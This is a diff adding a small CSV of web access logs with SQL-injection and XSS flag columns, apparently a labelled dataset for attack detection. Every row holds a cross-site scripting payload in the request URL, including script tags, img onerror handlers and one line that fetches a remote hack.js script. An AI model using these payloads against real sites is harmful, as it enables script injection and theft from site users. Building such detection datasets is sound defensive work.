@@ -1,0 +1,7 @@
+client,userid,datetime,method,request,status,size,referer,user_agent,sqli_flag,xss_flag
+198.51.100.23,-,2019-01-22 03:56:20+03:30,GET,/search?q=<script>alert('xss')</script>,200,1024,http://example.com/,Mozilla/5.0 (Macintosh; Intel Mac OS X),False,True
+192.0.2.11,-,2019-01-22 03:56:29+03:30,GET,/page?id=<script>fetch('http://example.com/hack.js')</script>,200,854,http://example.com/page,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,True
+192.0.2.13,-,2019-01-22 03:56:36+03:30,GET,/user/profile?id=<script>void(0)</script>,200,745,http://example.com/profile,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,True
+192.0.2.14,-,2019-01-22 03:56:44+03:30,GET,/contact?id=<img src=x onerror=alert('XSS')>,200,658,http://example.com/contact,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,True
+198.51.100.25,-,2019-01-22 03:56:34+03:30,GET,/article?id=<script>evilScript()</script>,200,1024,http://example.com/articles,Mozilla/5.0 (Macintosh; Intel Mac OS X),False,True
+198.51.100.26,-,2019-01-22 03:56:40+03:30,GET,/?q=<img src=x onerror=alert('XSS')>,200,675,http://example.com/search,Mozilla/5.0 (Windows NT 10.0; Win64; x64),False,True
